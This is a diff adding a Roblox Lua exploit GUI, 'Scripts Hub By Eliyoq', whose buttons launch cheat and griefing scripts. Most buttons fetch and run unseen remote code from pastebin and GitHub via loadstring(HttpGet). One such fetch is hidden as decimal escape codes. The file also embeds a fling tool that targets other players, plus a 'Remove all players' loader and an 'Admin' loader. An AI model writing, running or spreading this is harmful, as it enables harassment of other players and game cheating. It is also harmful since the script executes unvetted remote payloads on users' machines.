@@ -1,0 +1,557 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Welcome";
+	Text = "HAX";
+	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+Duration = 16;
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_2 = Instance.new("UICorner")
+local TextButton = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local TextButton_2 = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local TextButton_3 = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local TextButton_4 = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local TextButton_5 = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local TextButton_6 = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local TextButton_7 = Instance.new("TextButton")
+local UICorner_9 = Instance.new("UICorner")
+local TextButton_8 = Instance.new("TextButton")
+local UICorner_10 = Instance.new("UICorner")
+local TextButton_9 = Instance.new("TextButton")
+local UICorner_11 = Instance.new("UICorner")
+local TextButton_10 = Instance.new("TextButton")
+local UICorner_12 = Instance.new("UICorner")
+local TextButton_11 = Instance.new("TextButton")
+local UICorner_13 = Instance.new("UICorner")
+local TextButton_12 = Instance.new("TextButton")
+local UICorner_14 = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+local UICorner_15 = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(54, 65, 68)
+Frame.BorderSizePixel = 3
+Frame.Position = UDim2.new(0.211394295, 0, 0.181333318, 0)
+Frame.Size = UDim2.new(0, 384, 0, 238)
+Frame.Active = true
+Frame.Draggable = true
+
+UICorner.Parent = Frame
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+TextLabel.Size = UDim2.new(0, 384, 0, 34)
+TextLabel.Font = Enum.Font.Bangers
+TextLabel.Text = " Scripts Hub By Eliyoq"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 28.000
+TextLabel.TextStrokeColor3 = Color3.fromRGB(38, 136, 54)
+TextLabel.TextStrokeTransparency = 0.850
+TextLabel.TextWrapped = true
+
+UICorner_2.Parent = TextLabel
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton.Position = UDim2.new(0.018229166, 0, 0.176470593, 0)
+TextButton.Size = UDim2.new(0, 107, 0, 26)
+TextButton.Font = Enum.Font.Bangers
+TextButton.Text = "Remove all players"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+TextButton.MouseButton1Down:Connect(function()
+loadstring(game:HttpGet('https://pastebin.com/raw/3GmjuySP'))()
+end)
+
+UICorner_3.Parent = TextButton
+
+TextButton_2.Parent = Frame
+TextButton_2.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_2.Position = UDim2.new(0.359375, 0, 0.176470593, 0)
+TextButton_2.Size = UDim2.new(0, 107, 0, 26)
+TextButton_2.Font = Enum.Font.Bangers
+TextButton_2.Text = "invisible gui"
+TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.TextSize = 14.000
+TextButton_2.MouseButton1Down:Connect(function()
+loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
+end)
+
+UICorner_4.Parent = TextButton_2
+
+TextButton_3.Parent = Frame
+TextButton_3.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_3.Position = UDim2.new(0.690104127, 0, 0.176470593, 0)
+TextButton_3.Size = UDim2.new(0, 107, 0, 26)
+TextButton_3.Font = Enum.Font.Bangers
+TextButton_3.Text = "Dark Ghost Hub"
+TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.TextSize = 14.000
+TextButton_3.MouseButton1Down:Connect(function()
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\117\118\112\49\100\119\78\39\41\41\40\41\10")()
+end)
+
+UICorner_5.Parent = TextButton_3
+
+TextButton_4.Parent = Frame
+TextButton_4.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_4.Position = UDim2.new(0.690104127, 0, 0.340336144, 0)
+TextButton_4.Size = UDim2.new(0, 107, 0, 26)
+TextButton_4.Font = Enum.Font.Bangers
+TextButton_4.Text = "Not fe size script"
+TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_4.TextSize = 14.000
+TextButton_4.MouseButton1Down:Connect(function()
+function giant(p, size)	
+	local pchar = p.Character
+	if pchar then
+		local function scale(chr,scl)
+		
+			for _,v in pairs(pchar:GetChildren()) do
+				if v:IsA("Hat") then
+					v:Clone()
+					v.Parent = game.Lighting
+				end
+			end
+				
+		    local Head = chr['Head']
+		    local Torso = chr['Torso']
+		    local LA = chr['Left Arm']
+		    local RA = chr['Right Arm']
+		    local LL = chr['Left Leg']
+		    local RL = chr['Right Leg']
+		    local HRP = chr['HumanoidRootPart']
+		
+		    wait(0.1)
+		   
+		    Head.formFactor = 3
+		    Torso.formFactor = 3
+		    LA.formFactor = 3
+		    RA.formFactor = 3
+		    LL.formFactor = 3
+		    RL.formFactor = 3
+		    HRP.formFactor = 3
+		    
+		    Head.Size = Vector3.new(scl * 2, scl, scl)
+		    Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
+		    LA.Size = Vector3.new(scl, scl * 2, scl)
+		    RA.Size = Vector3.new(scl, scl * 2, scl)
+		    LL.Size = Vector3.new(scl, scl * 2, scl)
+		    RL.Size = Vector3.new(scl, scl * 2, scl)
+		    HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
+		    
+		    local Motor1 = Instance.new('Motor6D', Torso)
+		    Motor1.Part0 = Torso
+		    Motor1.Part1 = Head
+	    	Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
+	    	Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
+	    	Motor1.Name = "Neck"
+				    
+	    	local Motor2 = Instance.new('Motor6D', Torso)
+	    	Motor2.Part0 = Torso
+	    	Motor2.Part1 = LA
+	    	Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
+	    	Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
+	    	Motor2.Name = "Left Shoulder"
+	    	
+	    	local Motor3 = Instance.new('Motor6D', Torso)
+	   		Motor3.Part0 = Torso
+	    	Motor3.Part1 = RA
+	    	Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
+	    	Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
+	    	Motor3.Name = "Right Shoulder"
+	    	
+	    	local Motor4 = Instance.new('Motor6D', Torso)
+	    	Motor4.Part0 = Torso
+	    	Motor4.Part1 = LL
+	    	Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
+	    	Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
+	    	Motor4.Name = "Left Hip"
+	    	
+	    	local Motor5 = Instance.new('Motor6D', Torso)
+	    	Motor5.Part0 = Torso
+	    	Motor5.Part1 = RL
+	    	Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
+	    	Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
+	    	Motor5.Name = "Right Hip"
+	    	
+	    	local Motor6 = Instance.new('Motor6D', HRP)
+	    	Motor6.Part0 = HRP
+	    	Motor6.Part1 = Torso
+	    	Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
+	    	Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
+	    	    
+		end
+		
+		scale(pchar, size)
+		pchar.Humanoid.WalkSpeed = 15 * size
+	
+		for _,v in pairs(game.Lighting:GetChildren()) do
+			if v:IsA("Hat") then
+				v.Parent = pchar
+			end
+		end
+	end
+end
+
+local plr = game.Players.LocalPlayer
+giant(plr,1)
+
+
+local csize = 1
+
+local sgui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+local base = Instance.new("Frame", sgui)
+base.BackgroundTransparency = 1
+base.Size = UDim2.new(0, 110, 0, 200)
+base.Position = UDim2.new(1, -120, 1, -180)
+local indicator = Instance.new("TextLabel", base)
+indicator.Size = UDim2.new(1, 0, 0, 25)
+indicator.TextColor3 = Color3.new(1, 1, 1)
+indicator.BackgroundTransparency = 0
+indicator.FontSize = Enum.FontSize.Size18
+indicator.Font = Enum.Font.SourceSans
+indicator.Text = "Current Size: 3"
+local PlusOne = Instance.new("TextButton", base)
+PlusOne.BackgroundColor3 = Color3.new(214/255, 214/255, 214/255)
+PlusOne.Position = UDim2.new(0, 0, 0, 40)
+PlusOne.Size = UDim2.new(1, 0, 0.5, -50)
+PlusOne.BorderSizePixel = 2
+PlusOne.Font = Enum.Font.SourceSansBold
+PlusOne.FontSize = Enum.FontSize.Size24
+PlusOne.Text = "+.1 Size"
+local MinusOne = Instance.new("TextButton", base)
+MinusOne.BackgroundColor3 = Color3.new(214/255, 214/255, 214/255)
+MinusOne.Position = UDim2.new(0, 0, 0.5, 10)
+MinusOne.Size = UDim2.new(1, 0, 0.5, -50)
+MinusOne.Text = "-.1 Size"
+MinusOne.BorderSizePixel = 2
+MinusOne.Font = Enum.Font.SourceSansBold
+MinusOne.FontSize = Enum.FontSize.Size24
+
+PlusOne.MouseButton1Down:connect(function()
+	csize = csize + .1
+	giant(plr, csize)
+	indicator.Text = "Current Size: "..tostring(csize)
+end)
+
+MinusOne.MouseButton1Down:connect(function()
+	csize = csize - .1
+	giant(plr, csize)
+	indicator.Text = "Current Size: "..tostring(csize)
+end)
+end)
+
+UICorner_6.Parent = TextButton_4
+
+TextButton_5.Parent = Frame
+TextButton_5.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_5.Position = UDim2.new(0.361979127, 0, 0.340336144, 0)
+TextButton_5.Size = UDim2.new(0, 107, 0, 26)
+TextButton_5.Font = Enum.Font.Bangers
+TextButton_5.Text = "Admin"
+TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_5.TextSize = 14.000
+TextButton_5.MouseButton1Down:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/Caniwq2N",true))()
+end)
+
+UICorner_7.Parent = TextButton_5
+
+TextButton_6.Parent = Frame
+TextButton_6.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_6.Position = UDim2.new(0.0182291269, 0, 0.340336144, 0)
+TextButton_6.Size = UDim2.new(0, 107, 0, 26)
+TextButton_6.Font = Enum.Font.Bangers
+TextButton_6.Text = "old ui"
+TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_6.TextSize = 14.000
+TextButton_6.MouseButton1Down:Connect(function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kosuke14/REBOYHub/main/games/2016_Roblox.lua'))()
+end)
+
+UICorner_8.Parent = TextButton_6
+
+TextButton_7.Parent = Frame
+TextButton_7.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_7.Position = UDim2.new(0.0182291269, 0, 0.50420171, 0)
+TextButton_7.Size = UDim2.new(0, 107, 0, 26)
+TextButton_7.Font = Enum.Font.Bangers
+TextButton_7.Text = "Fling"
+TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_7.TextSize = 14.000
+TextButton_7.MouseButton1Down:Connect(function()
+
+local lp = game:FindService("Players").LocalPlayer
+
+local function gplr(String)
+	local Found = {}
+	local strl = String:lower()
+	if strl == "all" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			table.insert(Found,v)
+		end
+	elseif strl == "others" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name ~= lp.Name then
+				table.insert(Found,v)
+			end
+		end 
+	elseif strl == "me" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name == lp.Name then
+				table.insert(Found,v)
+			end
+		end 
+	else
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name:lower():sub(1, #String) == String:lower() then
+				table.insert(Found,v)
+			end
+		end 
+	end
+	return Found 
+end
+
+local function notif(str,dur)
+	game:FindService("StarterGui"):SetCore("SendNotification", {
+		Title = "yeet gui",
+		Text = str,
+		Icon = "rbxassetid://2005276185",
+		Duration = dur or 3
+	})
+end
+
+--// sds
+
+local h = Instance.new("ScreenGui")
+local Main = Instance.new("ImageLabel")
+local Top = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local TextBox = Instance.new("TextBox")
+local TextButton = Instance.new("TextButton")
+
+h.Name = "h"
+h.Parent = game:GetService("CoreGui")
+h.ResetOnSpawn = false
+
+Main.Name = "Main"
+Main.Parent = h
+Main.Active = true
+Main.Draggable = true
+Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
+Main.Size = UDim2.new(0, 454, 0, 218)
+Main.Image = "rbxassetid://2005276185"
+
+Top.Name = "Top"
+Top.Parent = Main
+Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
+Top.BorderSizePixel = 0
+Top.Size = UDim2.new(0, 454, 0, 44)
+
+Title.Name = "Title"
+Title.Parent = Top
+Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+Title.BorderSizePixel = 0
+Title.Position = UDim2.new(0, 0, 0.295454562, 0)
+Title.Size = UDim2.new(0, 454, 0, 30)
+Title.Font = Enum.Font.SourceSans
+Title.Text = "FE Yeet Gui (trollface edition)"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+TextBox.Parent = Main
+TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
+TextBox.Size = UDim2.new(0, 388, 0, 62)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderText = "Who do i destroy(can be shortened)"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextScaled = true
+TextBox.TextSize = 14.000
+TextBox.TextWrapped = true
+
+TextButton.Parent = Main
+TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
+TextButton.Size = UDim2.new(0, 359, 0, 50)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Cheese em'"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+TextButton.MouseButton1Click:Connect(function()
+	local Target = gplr(TextBox.Text)
+	if Target[1] then
+		Target = Target[1]
+		
+		local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
+		Thrust.Force = Vector3.new(9999,9999,9999)
+		Thrust.Name = "YeetForce"
+		repeat
+			lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
+			Thrust.Location = Target.Character.HumanoidRootPart.Position
+			game:FindService("RunService").Heartbeat:wait()
+		until not Target.Character:FindFirstChild("Head")
+	else
+		notif("Invalid player")
+	end
+end)
+
+--//fsddfsdf
+notif("Loaded successfully! Created by scuba#0001", 5)
+end)
+
+UICorner_9.Parent = TextButton_7
+
+TextButton_8.Parent = Frame
+TextButton_8.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_8.Position = UDim2.new(0.35937497, 0, 0.50420171, 0)
+TextButton_8.Size = UDim2.new(0, 107, 0, 26)
+TextButton_8.Font = Enum.Font.Bangers
+TextButton_8.Text = "Utg"
+TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_8.TextSize = 14.000
+TextButton_8.MouseButton1Down:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/killermaster9999mega/UTG-V3/main/FE%20UTG%20V3.txt"))()
+end)
+
+UICorner_10.Parent = TextButton_8
+
+TextButton_9.Parent = Frame
+TextButton_9.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_9.Position = UDim2.new(0.690104127, 0, 0.50420171, 0)
+TextButton_9.Size = UDim2.new(0, 107, 0, 26)
+TextButton_9.Font = Enum.Font.Bangers
+TextButton_9.Text = "Rtx"
+TextButton_9.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_9.TextSize = 14.000
+TextButton_9.MouseButton1Down:Connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/7rrgE4XL'),true))()
+end)
+
+UICorner_11.Parent = TextButton_9
+
+TextButton_10.Parent = Frame
+TextButton_10.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_10.Position = UDim2.new(0.690104127, 0, 0.680672288, 0)
+TextButton_10.Size = UDim2.new(0, 107, 0, 26)
+TextButton_10.Font = Enum.Font.Bangers
+TextButton_10.Text = ""
+TextButton_10.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_10.TextSize = 14.000
+TextButton_10.MouseButton1Down:Connect(function()
+
+end)
+
+UICorner_12.Parent = TextButton_10
+
+TextButton_11.Parent = Frame
+TextButton_11.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_11.Position = UDim2.new(0.361979127, 0, 0.680672288, 0)
+TextButton_11.Size = UDim2.new(0, 107, 0, 26)
+TextButton_11.Font = Enum.Font.Bangers
+TextButton_11.Text = "fe warrior fling"
+TextButton_11.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_11.TextSize = 14.000
+TextButton_11.MouseButton1Down:Connect(function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/ZJqjFFSZ'))();
+end)
+
+UICorner_13.Parent = TextButton_11
+
+TextButton_12.Parent = Frame
+TextButton_12.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+TextButton_12.Position = UDim2.new(0.0156249702, 0, 0.680672288, 0)
+TextButton_12.Size = UDim2.new(0, 107, 0, 26)
+TextButton_12.Font = Enum.Font.Bangers
+TextButton_12.Text = "keyboard script for fe warrior keybind is e"
+TextButton_12.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_12.TextSize = 14.000
+TextButton_12.MouseButton1Down:Connect(function()
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
+local KeyboardguiWarriorRoberrVersion = Instance.new("ScreenGui")
+local Drag = Instance.new("Frame")
+local Close = Instance.new("TextButton")
+
+--Properties:
+
+KeyboardguiWarriorRoberrVersion.Name = "Keyboard gui WarriorRoberr Version"
+KeyboardguiWarriorRoberrVersion.Parent = game.CoreGui
+KeyboardguiWarriorRoberrVersion.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Drag.Name = "Drag"
+Drag.Parent = KeyboardguiWarriorRoberrVersion
+Drag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Drag.BorderSizePixel = 0
+Drag.Position = UDim2.new(0.147916675, 0, 0.0593749993, 0)
+Drag.Size = UDim2.new(0, 270, 0, 30)
+Drag.Active = true
+Drag.Draggable = true
+
+Close.Name = "Close"
+Close.Parent = Drag
+Close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Close.BorderSizePixel = 0
+Close.Position = UDim2.new(0.999839723, 0, -0.00729167089, 0)
+Close.Size = UDim2.new(0, 30, 0, 30)
+Close.Font = Enum.Font.SourceSans
+Close.Text = "X"
+Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+Close.TextSize = 35.000
+Close.MouseButton1Click:Connect(function()
+	KeyboardguiWarriorRoberrVersion:Destroy()
+end)
+game.CoreGui["BUNB0yBUN BOARD"].KeyBoard.Parent = Drag
+game.CoreGui["BUNB0yBUN BOARD"]:Destroy()
+game.CoreGui["Keyboard gui WarriorRoberr Version"].Drag.KeyBoard.Bunb0ybun.Text = "MADE BY WARRIORROBERR BETTER VERSION "
+game.CoreGui["Keyboard gui WarriorRoberr Version"].Drag.KeyBoard.Position = UDim2.new(0, 0, 0, 35)
+game.CoreGui["Keyboard gui WarriorRoberr Version"].Drag.KeyBoard.Bunb0ybun.TextSize = 10
+end)
+
+UICorner_14.Parent = TextButton_12
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+TextLabel_2.Position = UDim2.new(0, 0, 0.857142866, 0)
+TextLabel_2.Size = UDim2.new(0, 384, 0, 34)
+TextLabel_2.Font = Enum.Font.Bangers
+TextLabel_2.Text = "Credits To Eliyoq"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 28.000
+TextLabel_2.TextStrokeColor3 = Color3.fromRGB(38, 136, 54)
+TextLabel_2.TextStrokeTransparency = 0.850
+TextLabel_2.TextWrapped = true
+
+UICorner_15.Parent = TextLabel_2
